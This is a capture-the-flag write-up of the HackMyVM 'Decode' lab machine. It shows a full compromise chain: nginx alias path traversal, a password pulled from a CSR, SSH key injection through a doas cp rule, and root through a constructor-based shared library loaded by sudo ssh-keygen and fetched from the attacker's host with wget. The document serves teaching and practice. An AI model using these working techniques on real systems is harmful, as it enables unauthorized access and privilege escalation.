# Decode

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Decode | avijneyam | Beginner | HackMyVM |

**Summary:** Decode is a beginner-level Linux machine that demonstrates multiple realistic security misconfigurations. The attack path begins with discovering an nginx web server exposing a robots.txt file containing filesystem hints. A critical nginx alias misconfiguration (`location /decode {alias /etc/;}`) without a trailing slash enables path traversal outside the intended /etc directory. This vulnerability is exploited to read sensitive files across the filesystem, ultimately revealing a Certificate Signing Request (CSR) containing a plaintext password in its challengePassword attribute. This credential grants SSH access as the user 'steve'. Privilege escalation to 'ajneya' is achieved by exploiting a doas configuration that permits steve to copy files as ajneya, allowing SSH key injection into ajneya's home directory. Final root access is obtained through a sudo misconfiguration allowing ajneya to execute ssh-keygen with arbitrary library loading, enabling a malicious shared library to spawn a root shell.

---

## Reconnaissance

### Network Discovery

Initial network scanning was performed to identify active hosts on the network:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.103 08:00:27:2E:87:C5 VirtualBox
```

The scan identified a VirtualBox VM at **192.168.100.103**.

### Port Scanning

A comprehensive Nmap scan was conducted against the target to identify open ports and running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ nmap -sC -sV -p- -T4 192.168.100.103
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-12 08:03 WIB
Nmap scan report for 192.168.100.103
Host is up (0.0092s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba (RSA)
|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 (ECDSA)
|_  256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.18.0
| http-robots.txt: 1 disallowed entry
|_/encode/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.93 seconds
```

**Key Findings:**
- **Port 22 (SSH)**: OpenSSH 8.4p1 Debian 5
- **Port 80 (HTTP)**: nginx 1.18.0 with a robots.txt file revealing `/encode/` as disallowed

### Web Enumeration

Accessing the web server on port 80 displayed the default nginx welcome page:

![80](image.png)

The page confirms nginx is successfully installed but requires further configuration. Source code inspection revealed no additional information.

The Nmap scan identified a **robots.txt** file. Examining its contents revealed interesting filesystem hints:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ curl http://192.168.100.103/robots.txt
User-agent: decode
Disallow: /encode/

User-agent: *
Allow: /
Allow: /decode
Allow: ../
Allow: /index
Allow: .shtml
Allow: /lfi../
Allow: /etc/
Allow: passwd
Allow: /usr/
Allow: share
Allow: /var/www/html/
Allow: /cgi-bin/
Allow: decode.sh
```

**Analysis:**
- The robots.txt file contains unusual Allow directives including `/etc/`, `/usr/`, `/lfi../`, and `passwd`
- These hints suggest potential path traversal or local file inclusion vulnerabilities
- A special user-agent "decode" is disallowed from `/encode/`

### Directory Enumeration

Directory brute-forcing against the root web directory:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ gobuster dir -u http://192.168.100.103/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.103/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/1                    (Status: 200) [Size: 240]
/cgi-bin              (Status: 301) [Size: 169] [--> http://192.168.100.103/cgi-bin/]
/cgi-bin/             (Status: 403) [Size: 15]
/decode               (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/]
/index.html           (Status: 200) [Size: 612]
/robots.txt           (Status: 200) [Size: 240]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

**Key Discovery**: `/decode` directory identified. Accessing `/1` returned the same content as robots.txt.

---

## Initial Access

### Nginx Configuration Discovery

Further enumeration was conducted against the `/decode` directory using a comprehensive wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ gobuster dir -u http://192.168.100.103/decode/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.103/decode/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/default              (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/default/]
/security             (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/security/]
/services             (Status: 200) [Size: 12813]
/profile              (Status: 200) [Size: 769]
/modules              (Status: 200) [Size: 195]
/network              (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/network/]
/php                  (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/php/]
/perl                 (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/perl/]
/group                (Status: 200) [Size: 758]
/environment          (Status: 200) [Size: 0]
/ssl                  (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/ssl/]
/ssh                  (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/ssh/]
/issue                (Status: 200) [Size: 27]
/networks             (Status: 200) [Size: 60]
/bluetooth            (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/bluetooth/]
/kernel               (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/kernel/]
/sv                   (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/sv/]
/shadow               (Status: 403) [Size: 153]
/fonts                (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/fonts/]
/protocols            (Status: 200) [Size: 2932]
/vim                  (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/vim/]
/rpc                  (Status: 200) [Size: 887]
/magic                (Status: 200) [Size: 111]
/hosts                (Status: 200) [Size: 186]
/emacs                (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/emacs/]
/passwd               (Status: 200) [Size: 1638]
/shells               (Status: 200) [Size: 116]
/opt                  (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/opt/]
/ldap                 (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/ldap/]
/apt                  (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/apt/]
/dhcp                 (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/dhcp/]
/motd                 (Status: 200) [Size: 286]
/alternatives         (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/alternatives/]
/nginx                (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/nginx/]
/X11                  (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/X11/]
/gss                  (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/gss/]
/selinux              (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/selinux/]
/timezone             (Status: 200) [Size: 17]
/python3              (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/python3/]
/skel                 (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/skel/]
/groff                (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/groff/]
/xdg                  (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/xdg/]
/udev                 (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/udev/]
/crontab              (Status: 200) [Size: 1042]
/rmt                  (Status: 200) [Size: 60376]
/apparmor             (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/apparmor/]
/hostname             (Status: 200) [Size: 7]
/localtime            (Status: 200) [Size: 3536]
/iproute2             (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/iproute2/]
/dpkg                 (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/dpkg/]
/terminfo             (Status: 301) [Size: 169] [--> http://192.168.100.103/decode/terminfo/]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

**Critical Observation**: The enumeration results revealed files and directories typically found in `/etc/` (passwd, hosts, hostname, nginx, ssh, etc.). This strongly suggests that `/decode` is aliased to `/etc/`.

### Password File Analysis

Retrieving the passwd file confirmed the mapping:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ curl "http://192.168.100.103/decode/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
steve:$y$j9T$gbohHcbFkUEmW0d3ZeUx40$Xa/DJJdFujIezo5lg9PDmswZH32cG6kAWP.crcqrqo/:1001:1001::/usr/share:/bin/bash
decoder:x:1002:1002::/home/decoder:/usr/sbin/nologin
ajneya:x:1003:1003::/home/ajneya:/bin/bash
```

**Notable Users**:
- **steve** (UID 1001): Home directory at `/usr/share`, has a yescrypt password hash
- **decoder** (UID 1002): No shell access
- **ajneya** (UID 1003): Standard home directory

An attempt to crack steve's password hash was unsuccessful, requiring an alternative approach.

### Exploiting Nginx Alias Misconfiguration

Examining the nginx configuration file revealed the vulnerability:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ curl http://192.168.100.103/decode/nginx/sites-available/default
##
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# https://www.nginx.com/resources/wiki/start/
# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
# https://wiki.debian.org/Nginx/DirectoryStructure
#
# In most cases, administrators will remove this file from sites-enabled/ and
# leave it as reference inside of sites-available where it will continue to be
# updated by the nginx packaging team.
#
# This file will automatically load configuration files provided by other
# applications, such as Drupal or Wordpress. These applications will be made
# available underneath a path with that package name, such as /drupal8.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

# Default server configuration
#
server {
        listen 80 default_server;
        root /var/www/html;
        ssi on;
        ssi_types *;
        #ssi_value_length 256;
        #subrequest_output_buffer_size 64k;
        #subrequest_output_buffer_length 8k;
        server_name _;
        index index.html index.htm index.shtml index.php;
        location /decode {alias /etc/;}
        include fcgiwrap.conf;
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.4-fpm.sock;
        }
}
```

**Vulnerability Identified**: 
```nginx
location /decode {alias /etc/;}
```

The critical flaw is the **missing trailing slash** after `/decode`. This allows path traversal:
- `location /decode {alias /etc/;}` should have been `location /decode/ {alias /etc/;}`
- Without the trailing slash, requesting `/decode../` resolves to `/etc/../`, enabling directory traversal

**Proof of Concept**:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ curl http://192.168.100.103/decode../var/www/html/robots.txt
User-agent: decode
Disallow: /encode/

User-agent: *
Allow: /
Allow: /decode
Allow: ../
Allow: /index
Allow: .shtml
Allow: /lfi../
Allow: /etc/
Allow: passwd
Allow: /usr/
Allow: share
Allow: /var/www/html/
Allow: /cgi-bin/
Allow: decode.sh
```

The path traversal vulnerability is confirmed. The robots.txt hints mentioned `/lfi../` and `/usr/share`, which is steve's home directory.

### Filesystem Enumeration via Path Traversal

Fuzzing steve's home directory for files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://192.168.100.103/decode../usr/share/FUZZ -mc 200,301

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.103/decode../usr/share/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301
________________________________________________

.bash_history           [Status: 200, Size: 38, Words: 3, Lines: 2, Duration: 19ms]
.bashrc                 [Status: 200, Size: 3526, Words: 487, Lines: 114, Duration: 18ms]
applications            [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 50ms]
bug                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 53ms]
doc                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 53ms]
file                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 56ms]
fonts                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 60ms]
icons                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 47ms]
info                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 52ms]
java                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 48ms]
locale                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 50ms]
man                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 48ms]
menu                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 56ms]
misc                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 57ms]
pam                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 57ms]
perl                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 51ms]
perl5                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 67ms]
php                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 90ms]
tools                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 29ms]
xml                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 49ms]
:: Progress: [4750/4750] :: Job [1/1] :: 738 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

**Critical Discovery**: `.bash_history` file found in `/usr/share` (steve's home directory).

### Credential Discovery

Examining the bash history:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ curl http://192.168.100.103/decode../usr/share/.bash_history
rm -rf /usr/share/ssl-cert/decode.csr
```

The history reveals a deleted Certificate Signing Request (CSR) file. However, the file still exists on the system:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ curl http://192.168.100.103/decode../usr/share/ssl-cert/decode.csr
-----BEGIN CERTIFICATE REQUEST-----
MIIDAzCCAesCAQAwSDERMA8GA1UEAwwISGFja015Vk0xDzANBgNVBAgMBmRlY29k
.............................[REDACTED].........................
h97It2ELpw==
-----END CERTIFICATE REQUEST-----
```

Downloading and analyzing the CSR:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ curl http://192.168.100.103/decode../usr/share/ssl-cert/decode.csr > decode.csr
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1123   0  1123   0     0 129362     0  --:--:-- --:--:-- --:--:-- 140375

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ openssl req -in decode.csr -noout -text
Certificate Request:
    Data:
        Version: 1 (0x0)
        Subject: CN=HackMyVM, ST=decode, L=decode, O=HackMyVM
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
...
                Exponent: 65537 (0x10001)
        Attributes:
            challengePassword        :i4[REDACTED]
            Requested Extensions:
                X509v3 Key Usage: critical
                    Digital Signature, Key Encipherment
                X509v3 Extended Key Usage: critical
                    TLS Web Server Authentication, TLS Web Client Authentication
                X509v3 Subject Alternative Name:
                    DNS:hackmyvm.eu
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
...
```

**Credential Extracted**: The CSR contains a challengePassword attribute with the value **`i4[REDACTED]`**

This is steve's password for SSH authentication.

### SSH Access as Steve

Using the discovered credentials to establish SSH access:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ ssh steve@192.168.100.103
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
steve@192.168.100.103's password:
Linux decode 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64
...
steve@decode:~$ id
uid=1001(steve) gid=1001(steve) groups=1001(steve)
steve@decode:~$ ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Apr 14  2022 .
drwxr-xr-x 18 root   root   4096 Apr 14  2022 ..
drwxr-xr-x  2 ajneya ajneya 4096 Apr 14  2022 ajneya
drwxr-xr-x  3 steve  steve  4096 Apr 14  2022 steve
steve@decode:~$ ls -la /home/ajneya/
total 24
drwxr-xr-x 2 ajneya ajneya 4096 Apr 14  2022 .
drwxr-xr-x 4 root   root   4096 Apr 14  2022 ..
lrwxrwxrwx 1 root   root      9 Apr 14  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ajneya ajneya  220 Aug  4  2021 .bash_logout
-rw-r--r-- 1 ajneya ajneya 3526 Aug  4  2021 .bashrc
-rw-r--r-- 1 ajneya ajneya  807 Aug  4  2021 .profile
-r-------- 1 ajneya ajneya   33 Apr 14  2022 user.txt
```

**Success**: SSH access obtained as steve. The user flag is located in ajneya's home directory but is not readable by steve.

---

## Privilege Escalation

### Escalation to Ajneya

Enumerating sudo privileges for steve:

```bash
steve@decode:~$ sudo -l
Matching Defaults entries for steve on decode:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User steve may run the following commands on decode:
    (decoder) NOPASSWD: /usr/bin/openssl enc *, /usr/bin/tee
steve@decode:~$ find / -user decoder 2>/dev/null
/opt/decode
steve@decode:~$ cd /opt
steve@decode:/opt$ ls -la
total 12
drwxr-xr-x  3 root    root    4096 Apr 14  2022 .
drwxr-xr-x 18 root    root    4096 Apr 14  2022 ..
drwx------  2 decoder decoder 4096 Apr 14  2022 decode
```

**Findings**:
- Steve can run `/usr/bin/openssl enc` and `/usr/bin/tee` as the decoder user
- `/opt/decode` is owned by decoder but is not accessible

Searching for SUID binaries:

```bash
steve@decode:/opt$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 182600 Feb 27  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 35040 Jan 20  2022 /usr/bin/umount
-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 71912 Jan 20  2022 /usr/bin/su
-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 39008 Feb  4  2021 /usr/bin/doas
-rwsr-xr-x 1 root root 55528 Jan 20  2022 /usr/bin/mount
-rwsr-xr-x 1 root root 481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

**Notable**: `doas` binary with SUID bit set. Checking the doas configuration:

```bash
steve@decode:/opt$ cat /etc/doas.conf
permit nopass steve as ajneya cmd cp
```

**Privilege Escalation Vector**: Steve can execute `cp` as ajneya without a password using doas. This allows copying files into ajneya's home directory, enabling SSH key injection.

### SSH Key Injection Attack

Generating a new SSH key pair on the local attack machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ ssh-keygen -t rsa -N "" -f id_rsa_ajneya
Generating public/private rsa key pair.
Your identification has been saved in id_rsa_ajneya
Your public key has been saved in id_rsa_ajneya.pub
The key fingerprint is:
SHA256:3CKqc+M6tCNQnY+AP7o14N5KsDFWlpHpZ1+jlPsq6IY ouba@CLIENT-DESKTOP
The key's randomart image is:
+---[RSA 3072]----+
|   .o            |
|   oo            |
| ..= .  .        |
|. =.oo + +       |
|=+ .oo+ S o      |
|==+ ...= .       |
|o=+oo   .        |
|=E*=o.   .       |
|.=*X.....        |
+----[SHA256]-----+

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ cat id_rsa_ajneya.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTuZ+[REDACTED]/fpPk36acnqgcuJfieF4YDW0Fakrk64StJgX1E5Mhs/n0= ouba@CLIENT-DESKTOP
```

On the target system as steve, creating the SSH authorized_keys structure:

```bash
steve@decode:/opt$ mkdir -p /tmp/.ssh
steve@decode:/opt$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTuZ+[REDACTED]/fpPk36acnqgcuJfieF4YDW0Fakrk64StJgX1E5Mhs/n0= ouba@CLIENT-DESKTOP' > /tmp/.ssh/authorized_keys
steve@decode:/opt$ ls -la /tmp/.ssh/authorized_keys
-rw-r--r-- 1 steve steve 573 Feb 11 22:09 /tmp/.ssh/authorized_keys
steve@decode:/opt$ doas -u ajneya cp -r /tmp/.ssh /home/ajneya/
```

**Exploit Execution**: Using doas to copy the malicious .ssh directory into ajneya's home directory, injecting our public key.

Authenticating as ajneya from the local machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ ssh ajneya@192.168.100.103 -i id_rsa_ajneya
...
Linux decode 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64
...
ajneya@decode:~$ id
uid=1003(ajneya) gid=1003(ajneya) groups=1003(ajneya)
ajneya@decode:~$ ls -la
total 28
drwxr-xr-x 3 ajneya ajneya 4096 Feb 11 22:09 .
drwxr-xr-x 4 root   root   4096 Apr 14  2022 ..
lrwxrwxrwx 1 root   root      9 Apr 14  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ajneya ajneya  220 Aug  4  2021 .bash_logout
-rw-r--r-- 1 ajneya ajneya 3526 Aug  4  2021 .bashrc
-rw-r--r-- 1 ajneya ajneya  807 Aug  4  2021 .profile
drwxr-xr-x 2 ajneya ajneya 4096 Feb 11 22:09 .ssh
-r-------- 1 ajneya ajneya   33 Apr 14  2022 user.txt
```

**Success**: Lateral movement to ajneya completed. The user flag is now accessible.

### Escalation to Root

Enumerating sudo privileges for ajneya:

```bash
ajneya@decode:~$ sudo -l
Matching Defaults entries for ajneya on decode:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ajneya may run the following commands on decode:
    (root) NOPASSWD: /usr/bin/ssh-keygen * /opt/*
```

**Privilege Escalation Vector**: Ajneya can execute `ssh-keygen` as root with arguments allowing wildcards and paths under `/opt/`. The ssh-keygen binary supports the `-D` flag to load PKCS#11 shared libraries, which can be exploited to execute arbitrary code.

### Malicious Shared Library Creation

Creating a malicious shared library on the local attack machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ vim root.c

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ cat root.c
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <grp.h>

void __attribute__ ((constructor)) init() {
    gid_t groups[] = {0};
    setgroups(1, groups);
    setresgid(0, 0, 0);
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

**Library Explanation**:
- The `constructor` attribute ensures `init()` executes when the library loads
- `setresuid(0, 0, 0)` sets all user IDs to root
- `setresgid(0, 0, 0)` sets all group IDs to root
- `setgroups(1, groups)` sets supplementary groups to root
- `system("/bin/bash -p")` spawns a privileged bash shell

### Transferring and Exploiting

Starting an HTTP server on the attack machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/decode]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Downloading the malicious library on the target:

```bash
ajneya@decode:~$ cd /tmp
ajneya@decode:/tmp$ wget http://192.168.100.1:8080/root.so
--2026-02-11 22:17:38--  http://192.168.100.1:8080/root.so
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14312 (14K) [application/octet-stream]
Saving to: 'root.so'

root.so                100%[==========================>]  13.98K  --.-KB/s    in 0s

2026-02-11 22:17:38 (294 MB/s) - 'root.so' saved [14312/14312]
```

Confirming the download on the attack machine:

```bash
172.21.32.1 - - [12/Feb/2026 10:17:40] "GET /root.so HTTP/1.1" 200 -
```

Executing the privilege escalation exploit:

```bash
ajneya@decode:/tmp$ sudo /usr/bin/ssh-keygen -D /tmp/root.so -f /opt/decode
root@decode:/tmp# cd
root@decode:~# whoami ; hostname ; id
root
decode
uid=0(root) gid=0(root) groups=0(root)
root@decode:~# cat /home/ajneya/user.txt /root/root.txt
[REDACTED]3ee
[REDACTED]845
```

**Root Access Achieved**: The ssh-keygen binary loaded the malicious shared library as root, executing the constructor function and spawning a root shell.

* **Sudo Policy Bypass:** Using `-f /opt/decode` satisfies the `/opt/*` requirement in the `sudoers` file, allowing the command to execute.
* **Initialization Priority:** `ssh-keygen` loads the PKCS#11 provider (`-D`) before validating the key file (`-f`). Our library's **constructor** triggers the root shell immediately upon loading, preempting any "invalid file" errors.

---

## Attack Chain Summary

1. **Reconnaissance**: Nmap scan identified SSH (22) and nginx web server (80) with robots.txt containing filesystem path hints and LFI indicators.

2. **Vulnerability Discovery**: Analyzed nginx configuration file via `/decode/nginx/sites-available/default` revealing critical misconfiguration: `location /decode {alias /etc/;}` without trailing slash, enabling path traversal via `/decode../` pattern.

3. **Credential Extraction**: Exploited path traversal to read `/usr/share/.bash_history` (steve's home), discovered deleted CSR reference, retrieved `/usr/share/ssl-cert/decode.csr`, extracted plaintext password `i4[REDACTED]` from challengePassword attribute using openssl.

4. **Initial Access**: Authenticated via SSH as steve using discovered credentials, enumerated system revealing doas configuration `permit nopass steve as ajneya cmd cp` and sudo permission for ajneya to execute ssh-keygen as root with wildcard arguments.

5. **Lateral Movement**: Generated SSH key pair, created authorized_keys structure in /tmp, used `doas -u ajneya cp -r /tmp/.ssh /home/ajneya/` to inject public key, authenticated as ajneya via SSH key.

6. **Privilege Escalation to Root**: Compiled malicious shared library with constructor function setting UID/GID to root and spawning bash, transferred root.so to target, executed `sudo /usr/bin/ssh-keygen -D /tmp/root.so -f /opt/decode` to load library as root, obtained root shell with full system compromise.
